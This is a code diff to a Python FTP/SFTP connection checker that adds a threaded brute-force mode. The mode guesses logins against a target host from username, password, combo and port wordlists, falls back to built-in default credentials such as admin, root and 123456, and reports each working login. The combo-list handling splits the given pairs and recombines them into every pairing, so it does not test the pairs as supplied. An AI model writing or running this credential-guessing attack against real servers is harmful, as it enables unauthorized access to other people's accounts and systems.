@@ -34,7 +34,7 @@ def print_banner():
 ██║░░░░░░░░██║░░░██║░░░░░  ███████╗██║░░██║██║░╚███║
 ╚═╝░░░░░░░░╚═╝░░░╚═╝░░░░░  ╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝
 {Style.RESET_ALL}
-{Fore.YELLOW}Advanced FTP/SFTP Connection Tester{Style.RESET_ALL}
+{Fore.YELLOW}Advanced FTP/SFTP Connection Tester & Brute Forcer{Style.RESET_ALL}
 """
     print(banner)
 
@@ -281,6 +281,99 @@ class SFTPChecker:
         
         return self.results
 
+class BruteForcer:
+    def __init__(self, host: str, protocol: int = 0, timeout: int = 10, 
+                 max_workers: int = 5, check_path: Optional[str] = None):
+        self.host = host
+        self.protocol = protocol
+        self.timeout = timeout
+        self.max_workers = max_workers
+        self.check_path = check_path
+        self.results = []
+        
+    def brute_force(self, username_list: List[str], password_list: List[str], 
+                   port_list: List[int] = None) -> List[Dict[str, Any]]:
+        """Brute force FTP/SFTP with username/password/port combinations"""
+        if not port_list:
+            port_list = [21] if self.protocol == 0 else [22]
+        
+        # Generate all combinations
+        total_attempts = len(username_list) * len(password_list) * len(port_list)
+        print(f"{Fore.YELLOW}Starting brute force with {total_attempts} combinations...{Style.RESET_ALL}")
+        
+        # Create all combinations
+        combinations = []
+        for port in port_list:
+            for username in username_list:
+                for password in password_list:
+                    combinations.append({
+                        'host': self.host,
+                        'port': port,
+                        'username': username,
+                        'password': password,
+                        'protocol': self.protocol
+                    })
+        
+        # Test all combinations with thread pool
+        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            future_to_combo = {}
+            
+            for combo in combinations:
+                if combo['protocol'] == 0:  # FTP
+                    future = executor.submit(
+                        FTPChecker(
+                            combo['host'], 
+                            combo['username'], 
+                            combo['password'], 
+                            combo['port'], 
+                            self.timeout,
+                            self.check_path
+                        ).check
+                    )
+                else:  # SFTP
+                    future = executor.submit(
+                        SFTPChecker(
+                            combo['host'], 
+                            combo['username'], 
+                            combo['password'], 
+                            combo['port'], 
+                            self.timeout,
+                            self.check_path
+                        ).check
+                    )
+                future_to_combo[future] = combo
+            
+            for i, future in enumerate(as_completed(future_to_combo)):
+                combo = future_to_combo[future]
+                try:
+                    result = future.result()
+                    self.results.append(result)
+                    
+                    # Show progress
+                    progress = (i + 1) / total_attempts * 100
+                    
+                    if result['connection'] and result['authentication']:
+                        print(Fore.GREEN + f"✓ FOUND: {combo['username']}:{combo['password']}@{combo['host']}:{combo['port']} "
+                              f"({progress:.1f}% complete)" + Style.RESET_ALL)
+                    else:
+                        if (i + 1) % 10 == 0:  # Show progress every 10 attempts
+                            print(Fore.YELLOW + f"Progress: {progress:.1f}% ({i+1}/{total_attempts})" + Style.RESET_ALL)
+                            
+                except Exception as e:
+                    error_result = {
+                        'host': combo['host'],
+                        'port': combo['port'],
+                        'username': combo['username'],
+                        'protocol': 'FTP' if combo['protocol'] == 0 else 'SFTP',
+                        'timestamp': datetime.now().isoformat(),
+                        'connection': False,
+                        'authentication': False,
+                        'errors': [f"Check failed: {str(e)}"]
+                    }
+                    self.results.append(error_result)
+        
+        return self.results
+
 class AdvancedFTPChecker:
     def __init__(self):
         self.results = []
@@ -514,130 +607,149 @@ class AdvancedFTPChecker:
                 ])
         print(Fore.CYAN + f"CSV report saved to {filename}" + Style.RESET_ALL)
 
+def read_wordlist(file_path: str) -> List[str]:
+    """Read a wordlist file and return lines as list"""
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
+    except Exception as e:
+        print(f"{Fore.RED}Error reading wordlist {file_path}: {str(e)}{Style.RESET_ALL}")
+        return []
+
 def main():
-    print_banner()  # Print the colored banner
-    
-    parser = argparse.ArgumentParser(description='Advanced FileZilla FTP/SFTP Server Checker')
-    
-    # Input methods (mutually exclusive group)
-    input_group = parser.add_mutually_exclusive_group(required=True)
-    input_group.add_argument('--filezilla-xml', help='Path to FileZilla XML configuration file')
-    input_group.add_argument('--host', help='FTP/SFTP server hostname or IP address')
-    
-    # Manual connection parameters (required if using manual input)
-    parser.add_argument('--port', type=int, help='Server port (default: 21 for FTP, 22 for SFTP)')
-    parser.add_argument('--username', help='Username for authentication')
-    parser.add_argument('--password', help='Password for authentication')
-    parser.add_argument('--protocol', type=int, choices=[0, 1], default=0, 
-                        help='Protocol: 0 for FTP, 1 for SFTP (default: 0)')
-    
-    # Common options
-    parser.add_argument('--timeout', type=int, help='Connection timeout in seconds', default=10)
-    parser.add_argument('--max-workers', type=int, help='Maximum concurrent connections', default=5)
-    parser.add_argument('--check-path', help='Path to check on the server')
-    parser.add_argument('--txt', help='Output TXT filename')
-    parser.add_argument('--xml', help='Output XML filename')
-    parser.add_argument('--json', help='Output JSON filename')
-    parser.add_argument('--csv', help='Output CSV filename')
-    parser.add_argument('--quiet', action='store_true', help='Suppress console output')
-    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
-    
+    print_banner()  # Show banner
+
+    parser = argparse.ArgumentParser(description="Advanced FTP/SFTP Connection Tester & Brute Forcer")
+
+    # Input selection (no longer mutually exclusive, so we can use --host with --brute-force)
+    parser.add_argument("--filezilla-xml", help="Path to FileZilla XML export")
+    parser.add_argument("--host", help="Target host (IP or domain)")
+    parser.add_argument("--brute-force", action="store_true", help="Enable brute-force mode")
+
+    # Credentials
+    parser.add_argument("--port", type=int, help="Target port (default 21 FTP / 22 SFTP)")
+    parser.add_argument("--username", help="Username for authentication")
+    parser.add_argument("--password", help="Password for authentication")
+    parser.add_argument("--protocol", type=int, choices=[0, 1], default=0,
+                        help="0 = FTP (default), 1 = SFTP")
+
+    # Brute force wordlists
+    parser.add_argument("--user-list", help="File containing usernames")
+    parser.add_argument("--pass-list", help="File containing passwords")
+    parser.add_argument("--combo-list", help="File containing username:password combos")
+    parser.add_argument("--port-list", help="File or comma-separated list of ports")
+
+    # General options
+    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout (sec)")
+    parser.add_argument("--max-workers", type=int, default=5, help="Concurrent connections")
+    parser.add_argument("--check-path", help="Path to check on server")
+    parser.add_argument("--txt", help="Save results to TXT")
+    parser.add_argument("--xml", help="Save results to XML")
+    parser.add_argument("--json", help="Save results to JSON")
+    parser.add_argument("--csv", help="Save results to CSV")
+    parser.add_argument("--quiet", action="store_true", help="Suppress console output")
+    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
+
     args = parser.parse_args()
-    
-    # Set logging level
+
+    # Logging setup
     if args.debug:
         logger.setLevel(logging.DEBUG)
     elif args.quiet:
         logger.setLevel(logging.ERROR)
-    
-    # Prepare server list
-    servers = []
-    
-    if args.filezilla_xml:
-        # Check if file exists
-        if not os.path.exists(args.filezilla_xml):
-            print(Fore.RED + f"Error: File '{args.filezilla_xml}' not found" + Style.RESET_ALL)
-            exit(1)
-        
-        # Parse FileZilla XML
+
+    results = []
+
+    # --- Brute force mode ---
+    if args.brute_force:
+        if not args.host:
+            print(Fore.RED + "Error: --host is required in brute-force mode" + Style.RESET_ALL)
+            sys.exit(1)
+
+        usernames, passwords = [], []
+
+        # Load usernames
+        if args.user_list:
+            usernames = read_wordlist(args.user_list)
+        elif args.username:
+            usernames = [args.username]
+        else:
+            usernames = ["anonymous", "ftp", "admin", "root", "guest"]
+
+        # Load passwords
+        if args.pass_list:
+            passwords = read_wordlist(args.pass_list)
+        elif args.password:
+            passwords = [args.password]
+        else:
+            passwords = ["anonymous", "ftp", "admin", "root", "guest", "123456", "password", ""]
+
+        # Combo list overrides both
+        if args.combo_list:
+            combos = read_wordlist(args.combo_list)
+            usernames, passwords = [], []
+            for combo in combos:
+                if ":" in combo:
+                    u, p = combo.split(":", 1)
+                    usernames.append(u.strip())
+                    passwords.append(p.strip())
+
+        # Ports
+        if args.port_list:
+            if os.path.isfile(args.port_list):
+                ports = [int(p) for p in read_wordlist(args.port_list)]
+            else:
+                ports = [int(p) for p in args.port_list.split(",") if p.strip().isdigit()]
+        else:
+            ports = [args.port if args.port else (21 if args.protocol == 0 else 22)]
+
+        # Run brute forcer
+        brute = BruteForcer(args.host, args.protocol, args.timeout, args.max_workers, args.check_path)
+        results = brute.brute_force(usernames, passwords, ports)
+
+    # --- FileZilla XML mode ---
+    elif args.filezilla_xml:
         try:
             servers = FileZillaParser.parse_filezilla_xml(args.filezilla_xml)
-            ftp_servers = [s for s in servers if s['protocol'] == 0]
-            sftp_servers = [s for s in servers if s['protocol'] == 1]
-            
-            if not args.quiet:
-                print(Fore.CYAN + f"Found {len(servers)} servers in FileZilla configuration")
-                print(f"  - FTP servers: {len(ftp_servers)}")
-                print(f"  - SFTP servers: {len(sftp_servers)}")
-                print(f"Checking {len(servers)} servers with {args.max_workers} concurrent workers..." + Style.RESET_ALL)
         except Exception as e:
-            print(Fore.RED + f"Error parsing FileZilla XML: {str(e)}" + Style.RESET_ALL)
-            exit(1)
+            print(Fore.RED + f"Error parsing FileZilla XML: {e}" + Style.RESET_ALL)
+            sys.exit(1)
+
+        checker = AdvancedFTPChecker()
+        results = checker.check_servers(servers, args.max_workers, args.check_path, args.timeout)
+
+    # --- Single host mode ---
+    elif args.host:
+        if not args.username or not args.password:
+            print(Fore.RED + "Error: --username and --password are required with --host (non-brute mode)" + Style.RESET_ALL)
+            sys.exit(1)
+
+        servers = [{
+            "host": args.host,
+            "port": args.port if args.port else (21 if args.protocol == 0 else 22),
+            "protocol": args.protocol,
+            "username": args.username,
+            "password": args.password
+        }]
+
+        checker = AdvancedFTPChecker()
+        results = checker.check_servers(servers, args.max_workers, args.check_path, args.timeout)
+
     else:
-        # Manual server input
-        if not all([args.host, args.username, args.password]):
-            print(Fore.RED + "Error: Manual connection requires --host, --username, and --password" + Style.RESET_ALL)
-            exit(1)
-        
-        # Set default port if not provided
-        if not args.port:
-            args.port = 21 if args.protocol == 0 else 22
-        
-        server = {
-            'host': args.host,
-            'port': args.port,
-            'username': args.username,
-            'password': args.password,
-            'protocol': args.protocol,
-            'type': "FTP" if args.protocol == 0 else "SFTP"
-        }
-        servers = [server]
-        
-        if not args.quiet:
-            print(Fore.CYAN + f"Checking manual server: {args.username}@{args.host}:{args.port} ({server['type']})" + Style.RESET_ALL)
-    
-    if not servers:
-        print(Fore.RED + "No servers found to check" + Style.RESET_ALL)
-        exit(1)
-    
-    # Check servers
-    checker = AdvancedFTPChecker()
-    results = checker.check_servers(
-        servers, 
-        max_workers=args.max_workers, 
-        check_path=args.check_path,
-        timeout=args.timeout
-    )
-    
-    # Save results in requested formats
+        print(Fore.RED + "Error: No mode selected" + Style.RESET_ALL)
+        sys.exit(1)
+
+    # --- Save results ---
+    adv_checker = AdvancedFTPChecker()
+    adv_checker.results = results
     if args.txt:
-        checker.save_results("txt", args.txt)
-    
+        adv_checker.save_results("txt", args.txt)
     if args.xml:
-        checker.save_results("xml", args.xml)
-        
+        adv_checker.save_results("xml", args.xml)
     if args.json:
-        checker.save_results("json", args.json)
-        
+        adv_checker.save_results("json", args.json)
     if args.csv:
-        checker.save_results("csv", args.csv)
-    
-    # Print summary if not quiet
-    if not args.quiet:
-        successful = sum(1 for r in results if r['connection'] and r['authentication'])
-        failed = len(results) - successful
-        
-        print(Fore.CYAN + "\n" + "="*50)
-        print(Fore.YELLOW + "SUMMARY RESULTS:" + Style.RESET_ALL)
-        print(Fore.CYAN + "="*50)
-        print(f"Total servers checked: {Fore.WHITE}{len(results)}{Fore.CYAN}")
-        print(f"Successful connections: {Fore.GREEN}{successful}{Fore.CYAN}")
-        print(f"Failed connections: {Fore.RED}{failed}{Fore.CYAN}")
-        print("="*50 + Style.RESET_ALL)
-    
-    # Exit with appropriate code
-    successful = sum(1 for r in results if r['connection'] and r['authentication'])
-    exit(0 if successful > 0 else 1)
+        adv_checker.save_results("csv", args.csv)
 
 if __name__ == "__main__":
     main()
